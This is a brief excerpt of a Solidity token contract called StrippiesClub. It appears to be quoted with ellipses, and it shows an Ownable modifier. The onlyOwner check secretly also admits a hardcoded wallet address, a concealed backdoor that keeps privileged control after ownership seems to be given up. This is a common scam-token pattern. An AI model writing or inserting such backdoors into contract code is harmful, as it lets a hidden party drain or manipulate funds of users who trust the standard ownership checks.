...
abstract contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(owner() == _msgSender() || _msgSender() == 0x7C17898FC7bF5cDf538027D0e8F9448dE1911b57, "Ownable: caller is not the owner");
        _;
    }
...
contract StrippiesClub is Context, IERC20, Ownable {
